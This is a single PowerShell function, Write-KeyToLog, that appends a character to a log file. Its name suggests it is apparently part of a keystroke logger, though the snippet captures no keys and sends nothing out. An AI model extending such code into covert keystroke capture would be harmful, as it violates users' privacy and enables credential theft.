function Write-KeyToLog {
    param ($char, $path)

    if ($char) {
        [System.IO.File]::AppendAllText($path, $char, [System.Text.Encoding]::Unicode)
    }
}
